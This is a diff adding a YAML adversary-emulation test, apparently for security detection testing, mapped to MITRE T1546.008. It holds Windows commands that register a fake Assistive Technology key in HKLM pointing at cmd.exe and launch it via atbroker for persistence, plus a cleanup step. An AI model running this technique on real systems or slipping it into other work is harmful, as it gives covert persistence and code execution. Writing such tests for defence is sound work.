@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
+description: |
+    Executes code specified in the registry for a new AT (Assistive Technologies).
+uuid: 444ff124-4c83-4e28-8df6-6efd3ece6bd4
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.008: Accessibility Features'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: atbroker.exe-(at)-executes-arbitrary-command-via-registry-key
+      inline: |
+        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
+        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
+        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
+        atbroker /start malware_test
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
+        executor: command_prompt
